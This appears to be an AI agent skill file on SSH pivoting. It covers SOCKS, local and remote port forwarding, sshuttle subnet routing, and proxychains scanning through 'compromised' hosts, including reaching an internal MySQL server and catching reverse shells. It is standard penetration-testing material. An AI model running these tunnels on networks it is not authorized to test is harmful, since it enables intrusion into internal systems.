---
name: ssh-tunneling
description: "Pivoting and Tunneling via SSH: Dynamic (SOCKS), Local (-L), Remote (-R), and full subnet routing via Sshuttle."
---

# ssh-tunneling (and sshuttle)

**Goal**: Exploit authorized or compromised SSH access to route attack traffic into internal subnets, bypassing firewalls and NAT without needing external binaries like Chisel.

## Cognitive Stance

SSH is the quintessential "Living off the Land" pivoting tool on Unix systems. 
- If you need to access multiple internal subnets dynamically, use **Sshuttle** (if Python is present on the target) or **Dynamic Port Forwarding (-D)**.
- If you only need to expose one internal port to your attacker machine, use **Local Port Forwarding (-L)**.
- If you need your attacker machine to receive callbacks from the internal network (e.g. reverse shells), use **Remote Port Forwarding (-R)**.

## 1. Dynamic Port Forwarding (SOCKS4 / SOCKS5)

```bash
# Creates a SOCKS proxy on your attacker machine at 127.0.0.1:1080 
# -f: go to background, -N: do not execute remote command
ssh -fN -D 1080 user@<COMPROMISED_HOST>
```
*Setup*: Ensure `/etc/proxychains4.conf` has `socks4 127.0.0.1 1080` (or `socks5`). You can now run `proxychains4 nmap -sT ...` to scan the internal network safely. TCP only.

## 2. Local Port Forwarding

Forward a specific port on the compromised host's internal network to your local attacker machine.
```bash
# Example: The compromised host can see an internal database at 10.10.10.50:3306
# We forward our LOCAL port 3306 to that internal IP via the SSH tunnel.
ssh -fN -L 3306:10.10.10.50:3306 user@<COMPROMISED_HOST>

# Attack:
mysql -h 127.0.0.1 -u root -p
```

## 3. Remote Port Forwarding

Forward a port on the compromised host *back* to the attacker machine. Extremely useful when catching reverse shells from deeper internal networks that cannot reach the internet.
```bash
# Example: We want the compromised host's port 8080 to forward to OUR port 80 (Attacker)
ssh -fN -R 8080:127.0.0.1:80 user@<COMPROMISED_HOST>
```
*(Note: To bind to `0.0.0.0` instead of loopback on the remote host, `GatewayPorts yes` must be set in the target's `sshd_config`).*

## 4. Subnet Routing (Sshuttle)

`Sshuttle` requires Python to be installed on the remote target. It creates an iptables/pf NAT layer locally, routing whole subnets transparently without `proxychains` (meaning UDP and DNS tunneling work better).

```bash
# Route the entire 10.10.20.0/24 subnet through the SSH connection.
# --dns forces DNS resolution over the tunnel.
sshuttle -r user@<COMPROMISED_HOST> 10.10.20.0/24 --dns
```

## Quality Gates

- **Scan Limitations**: Nmap SYN scans (`-sS`) do not work through SOCKS proxies. You must force TCP Connect scans (`-sT`). Also, do not run high-speed scans (`-T4`/`-T5`) via Proxychains or SSH control channels will collapse. Use `-T2` or `-T3`.
- **Chaining Pivot Hosts**: If you compromise Host A, and then Host B, you can nest tunnels. Add the second jump to Proxychains: `socks5 127.0.0.1 1080` and `socks5 127.0.0.1 1081`. Order matters in `strict_chain`.
